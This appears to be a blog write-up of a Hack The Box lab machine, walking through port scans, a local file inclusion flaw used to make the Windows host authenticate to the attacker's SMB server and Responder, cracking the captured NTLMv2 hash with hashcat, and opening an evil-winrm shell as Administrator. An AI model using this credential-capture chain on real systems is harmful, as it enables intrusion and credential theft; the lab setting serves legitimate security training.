---
layout: post
title: responder
categories: htb
tags:
- htb
- starting_point
- responder
author: nicoliboli
description: starting point | tier 1 | box 3
date: '2025-06-28 22:15:50 -0400'
---
# enumeration

```
$ nmap 10.129.95.234   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-28 21:30 EDT
Nmap scan report for 10.129.95.234
Host is up (0.10s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds

$ nmap -sC -sV -p 80 10.129.95.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-28 21:30 EDT
Nmap scan report for 10.129.95.234
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds

$ nmap -Pn -T5 -p- 10.129.95.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-28 21:30 EDT
Nmap scan report for 10.129.95.234
Host is up (0.10s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 141.37 seconds

$ nmap -sC -sV -p 80,5985,7680 10.129.95.234 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-28 22:07 EDT
Nmap scan report for unika.htb (10.129.95.234)
Host is up (0.19s latency).

PORT     STATE    SERVICE   VERSION
80/tcp   open     http      Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Unika
5985/tcp open     http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp filtered pando-pub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds
```

## port 80 - http

try to visit the website and get redirected to `unika.htb`

![responder_redirect](/assets/img/responder_redirect.png)

update the `/etc/hosts` file to associate that domain with the box's ip. this way our machine will know where to go when it encouters that ip

```
$ cat /etc/hosts                                               
127.0.0.1       localhost
127.0.1.1       kali
10.129.95.234   unika.htb
```

visit the domain again and see that it resolves

![responder_unika](/assets/img/responder_unika.png)

look at the source and notice there is potential for a local file inclusion vulnerability with the `page` parameter

![responder_source](/assets/img/responder_source.png)

i know the OS is Windows from the nmap scan earlier (can also check the response headers using developer tools in the browser), so i can test the lfi by trying to read a file that exists on Windows computers

![responder_hosts](/assets/img/responder_hosts.png)

now see if the file can be read remotely. setup an SMB server, host a file, and access it via the `page` parameter

```
$ cat test.txt  
testing

$ impacket-smbserver -ip 10.10.14.189 -smb2support share .
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.95.234,65217)
[*] AUTHENTICATE_MESSAGE (RESPONDER\Administrator,RESPONDER)
[*] User RESPONDER\Administrator authenticated successfully
[*] Administrator::RESPONDER:aaaaaaaaaaaaaaaa:4565744f895b6ab8b365386a12120049:010100000000000080b6b26798e8db01de233284f260db6f0000000001001000560042006c0076006f0053006100450003001000560042006c0076006f00530061004500020010005300460050004a0054004e0053005400040010005300460050004a0054004e00530054000700080080b6b26798e8db01060004000200000008003000300000000000000001000000002000005481ac418e1f6c9f1455312bd503da677b0d3b615e4921667d50c9de182b0fd50a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100380039000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:SHARE)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)
[*] Closing down connection (10.129.95.234,65217)
[*] Remaining connections []
```

![responder_testfile](/assets/img/responder_testfile.png)

run `responder` to try to capture the NTLM

```
$ responder                        
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[!] Responder must be run as root.
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo responder     
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Error: -I <if> mandatory option is missing
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo responder -I tun0 -A
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [OFF]
    NBT-NS                     [OFF]
    MDNS                       [OFF]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [ON]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.189]
    Responder IPv6             [dead:beef:2::10bb]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-V5ASQREGJUW]
    Responder Domain Name      [3O5S.LOCAL]
    Responder DCE-RPC Port     [47066]

[+] Listening for events...                                                                                                                                

[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.14.189) is not on the same subnet than the DNS server (192.168.1.1).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:8c452a36436bfef1:42AD839F1CF886B1B328A19312AF7083:01010000000000000095598377E8DB01966497B8D938E695000000000200080033004F003500530001001E00570049004E002D00560035004100530051005200450047004A005500570004003400570049004E002D00560035004100530051005200450047004A00550057002E0033004F00350053002E004C004F00430041004C000300140033004F00350053002E004C004F00430041004C000500140033004F00350053002E004C004F00430041004C00070008000095598377E8DB01060004000200000008003000300000000000000001000000002000005481AC418E1F6C9F1455312BD503DA677B0D3B615E4921667D50C9DE182B0FD50A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380039000000000000000000                                        
[*] Skipping previously captured hash for RESPONDER\Administrator
[*] Skipping previously captured hash for RESPONDER\Administrator
[+] Exiting...
```

i know the lab says to use `john`, but i'm more of a `hashcat` kinda person. so first needed to figure out the mode. i can see from the info in responder the the hash is `NTLMv2`, so 5600 is a good bet

![responder_hashcat](/assets/img/responder_hashcat.png)

run it through hashcat against the `rockyou` list and it cracks pretty quick

```
$ hashcat -m 5600 -a 0 ./hash /usr/share/wordlists/rockyou.txt                                                             
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-9700K CPU @ 3.60GHz, 2155/4374 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

ADMINISTRATOR::RESPONDER:8c452a36436bfef1:42ad839f1cf886b1b328a19312af7083:01010000000000000095598377e8db01966497b8d938e695000000000200080033004f003500530001001e00570049004e002d00560035004100530051005200450047004a005500570004003400570049004e002d00560035004100530051005200450047004a00550057002e0033004f00350053002e004c004f00430041004c000300140033004f00350053002e004c004f00430041004c000500140033004f00350053002e004c004f00430041004c00070008000095598377e8db01060004000200000008003000300000000000000001000000002000005481ac418e1f6c9f1455312bd503da677b0d3b615e4921667d50c9de182b0fd50a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100380039000000000000000000:badminton
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ADMINISTRATOR::RESPONDER:8c452a36436bfef1:42ad839f1...000000
Time.Started.....: Sat Jun 28 22:02:54 2025 (0 secs)
Time.Estimated...: Sat Jun 28 22:02:54 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    99488 H/s (0.73ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 3072/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: adriano -> oooooo
Hardware.Mon.#1..: Util: 30%

Started: Sat Jun 28 22:02:32 2025
Stopped: Sat Jun 28 22:02:55 2025
```

# exploitation

use `evil-winrm` to connect with the username `Administrator` and look around until you find the flag

```
$ evil-winrm -i 10.129.95.234 -u Administrator 
Enter Password: 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public
```

![responder_flag](/assets/img/responder_flag.png)
